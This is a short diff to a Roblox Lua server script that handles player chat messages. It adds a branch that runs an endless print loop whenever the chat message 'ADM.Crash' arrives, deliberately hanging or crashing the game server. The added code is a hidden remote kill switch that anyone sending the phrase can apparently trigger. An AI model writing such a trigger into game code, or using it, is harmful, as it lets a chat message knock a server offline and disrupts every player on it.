@@ -94,6 +94,10 @@ game.Players.PlayerAdded:Connect(function(player)
 				for index,lagobj in pairs(LagObjcets) do
 					lagobj:Destroy()
 				end
+			elseif message == "ADM.Crash" then
+				while tick() do
+					print("CrashTHEServer")
+				end
 			end
 		end)
 	end
